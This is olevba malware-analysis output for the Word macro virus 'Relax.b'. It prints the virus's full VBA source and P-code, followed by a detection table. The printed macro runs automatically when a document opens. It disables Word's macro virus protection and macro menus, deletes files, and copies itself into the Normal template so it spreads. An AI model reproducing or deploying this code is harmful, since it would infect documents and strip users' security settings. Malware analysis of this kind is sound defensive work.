olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Relax.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Relax.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Baby[Bench] v2.1
Private CountChar_1 As Integer: Private CountChar_2 As Integer
Private Sub Document_Open()
On Error Resume Next
Kill ("c:\WinIO.dll")
Kill ("c:\Brigl.txt")
Kill ("c:\Ethan.__")
CountChar_1 = ActiveDocument.Characters.Count
Application.Options.ConfirmConversions = False: Application.EnableCancelKey = wdCancelDisabled
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
CommandBars("Tools").Controls("Macro").Enabled = False
If Application.Version = 9# Then: CommandBars("Macro").Controls("Security...").Enabled = 0
If Application.Version = 8# Then
    With Application.Options: .VirusProtection = False: .SaveNormalPrompt = False: End With
End If
If MacroContainer = NormalTemplate Then Set Host = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule Else Set Host = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If MacroContainer = ActiveDocument Then Set Carrier = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule Else Set Carrier = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Open "c:\WinIO.dll" For Output As 1
For x = 1 To Carrier.CountOfLines: Line = Carrier.Lines(x, 1): Print #1, Line: Next x
Close 1
With Host: .Deletelines 1, .CountOfLines: .AddFromFile ("c:\WinIO.dll"): End With
Kill ("c:\WinIO.dll")
If Hour(Now) = 8 And Minute(Now) = 45 Then
   With Assistant.NewBalloon
       .Icon = msoIconAlert
       .Heading = "Baby[Bench] Millenium"
       .Text = "Phew! I'm just about beat." & vbCr & "It's been a long day! You gotta relax sometime!" & vbCr & vbCr & "Wow! Everything's blurry!"
       .Show
   End With
   ActiveDocument.Content.Font.Animation = wdAnimationShimmer
End If
End Sub
Private Sub Document_Close()
On Error Resume Next
CountChar_2 = ActiveDocument.Characters.Count
If Left$(ActiveDocument.Name, 8) = "Document" And CountChar_2 = 0 And CountChar_1 = 0 Then
ActiveDocument.Saved = True
ElseIf CountChar_1 = CountChar_2 Then ActiveDocument.Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Relax.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4735 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0010 "Baby[Bench] v2.1"
' Line #2:
' 	Dim (Private) 
' 	VarDefn CountChar_1 (As Integer)
' 	BoS 0x0000 
' 	Dim (Private) 
' 	VarDefn CountChar_2 (As Integer)
' Line #3:
' 	FuncDefn (Private Sub Document_Open())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitStr 0x000C "c:\WinIO.dll"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #6:
' 	LitStr 0x000C "c:\Brigl.txt"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #7:
' 	LitStr 0x000B "c:\Ethan.__"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	St CountChar_1 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #10:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' 	BoS 0x0000 
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #11:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4022 
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	EndIf 
' Line #13:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4020 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Host 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Host 
' 	EndIf 
' Line #17:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Carrier 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Carrier 
' 	EndIf 
' Line #18:
' 	LitStr 0x000C "c:\WinIO.dll"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #19:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	For 
' 	BoS 0x0000 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	ArgsMemLd Lines 0x0002 
' 	St Like 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #21:
' 	StartWithExpr 
' 	Ld Host 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith Deletelines 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000C "c:\WinIO.dll"
' 	Paren 
' 	ArgsMemCallWith AddFromFile 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' Line #22:
' 	LitStr 0x000C "c:\WinIO.dll"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #23:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x002D 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #24:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #25:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #26:
' 	LitStr 0x0015 "Baby[Bench] Millenium"
' 	MemStWith Heading 
' Line #27:
' 	LitStr 0x001A "Phew! I'm just about beat."
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x002F "It's been a long day! You gotta relax sometime!"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Wow! Everything's blurry!"
' 	Concat 
' 	MemStWith Then 
' Line #28:
' 	ArgsMemCallWith Show 0x0000 
' Line #29:
' 	EndWith 
' Line #30:
' 	Ld wdAnimationShimmer 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Font 
' 	MemSt Animation 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Private Sub Document_Close())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	St CountChar_2 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Ld CountChar_2 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld CountChar_1 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #37:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #38:
' 	Ld CountChar_1 
' 	Ld CountChar_2 
' 	Eq 
' 	ElseIfBlock 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |WinIO.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

